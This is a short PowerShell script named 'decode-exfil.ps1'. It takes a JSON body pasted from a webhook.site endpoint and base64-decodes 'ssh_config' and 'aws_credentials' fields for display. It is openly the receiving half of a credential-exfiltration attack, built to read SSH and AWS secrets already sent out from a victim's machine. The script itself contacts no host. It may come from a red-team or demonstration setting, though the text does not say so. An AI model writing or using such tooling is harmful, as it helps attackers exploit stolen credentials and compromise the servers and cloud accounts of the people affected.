# decode-exfil.ps1
# Decodes base64-encoded credential data received at the webhook endpoint.
# Paste the raw JSON body from webhook.site when prompted, or pass it as a parameter.
#
# Usage:
#   .\decode-exfil.ps1
#   .\decode-exfil.ps1 -JsonBody '{"ssh_config":"...","aws_credentials":"..."}'

param(
    [string]$JsonBody
)

if (-not $JsonBody) {
    Write-Host "[*] Paste the raw JSON body from webhook.site and press Enter:" -ForegroundColor Cyan
    $JsonBody = Read-Host
}

try {
    $data = $JsonBody | ConvertFrom-Json

    if ($data.ssh_config) {
        Write-Host "`n=== SSH Config ===" -ForegroundColor Green
        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.ssh_config))
        Write-Host $decoded
    }

    if ($data.aws_credentials) {
        Write-Host "`n=== AWS Credentials ===" -ForegroundColor Green
        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.aws_credentials))
        Write-Host $decoded
    }

    if (-not $data.ssh_config -and -not $data.aws_credentials) {
        Write-Host "[!] No ssh_config or aws_credentials fields found in JSON." -ForegroundColor Yellow
        Write-Host "[*] Raw parsed JSON:" -ForegroundColor Cyan
        $data | Format-List
    }
} catch {
    Write-Host "[!] Failed to parse JSON: $_" -ForegroundColor Red
}
